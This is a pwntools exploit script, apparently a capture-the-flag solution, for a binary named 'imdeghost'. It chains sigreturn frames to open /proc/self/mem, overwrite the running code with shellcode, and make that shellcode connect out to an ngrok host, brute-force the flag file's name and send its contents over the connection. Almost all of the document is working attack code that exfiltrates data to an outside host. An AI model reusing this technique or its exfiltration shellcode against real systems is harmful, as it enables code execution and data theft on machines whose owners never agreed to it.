from pwn import *

#init

e = ELF('./imdeghost')

context.binary = e

p = process(e.path)

#funcs

def srop(rax, rdi = 0, rsi = 0, rdx = 0, r10 = 0):
    f = SigreturnFrame()

    f.rax = rax
    f.rdi = rdi
    f.rsi = rsi
    f.rdx = rdx
    f.r10 = r10

    f.rip = off2 + sys
    f.rsp = off1 + len(s) + len(bytes(f))
    f.r14 = 0x0
    f.r15 = 0xf

    return bytes(f)

#vars

off1 = 0x6900000000
off2 = 0x133700000000
sys = 0x4b
buf1 = 0x300
buf2 = 0x400

#reverse connect and brute force file name

shellcode = shellcraft.connect('4.tcp.ngrok.io', 14449)
shellcode += '''
    /* brute force file name */

    mov r14, 0x1000
    mov rdi, rsp
    add rdi, 0x100

    loop:
    dec r14
    mov r13, r14
    mov r15, 0x10
    add rdi, 0x10
    mov BYTE PTR [rdi], 0x0

    loop2:
    dec r15
    dec rdi
    mov rax, r13
    and rax, 0x1
    add rax, 0x30
    mov [rdi], al
    shr r13, 0x1
    test r15, r15
    jnz loop2

'''
shellcode += shellcraft.syscall(0x2, 'rdi', 0x0)
shellcode += '''
    test rax, rax
    js loop

'''
shellcode += shellcraft.sendfile('rbp', 'rax', 0x0, 0x100)
shellcode += shellcraft.exit(0)

log.info('Shellcode:\n' + shellcode)
log.info('Shellcode len: ' + hex(len(shellcode)))

#exploit

#use sigreturns to construct rop chain and write shellcode using /proc/self/mem

s = p64(off2 + sys) #sigreturn
s += srop(0x2, off1 + buf1, 0x1) #open
s += p64(off2 + sys) #sigreturn
s += srop(0x12, 0x0, off1 + buf2, len(asm(shellcode)), off2 + buf2) #pwrite64
s += p64(off2 + buf2) #shellcode

log.info('Rop len: ' + hex(len(s)))

s = s.ljust(buf1, b'\x00')
s += b'/proc/self/mem'
s = s.ljust(buf2, b'\x00')
s += asm(shellcode)
s = s.ljust(0xe0e, b'\x00')

p.sendlineafter('again.', s)

#pray for flag

p.interactive()
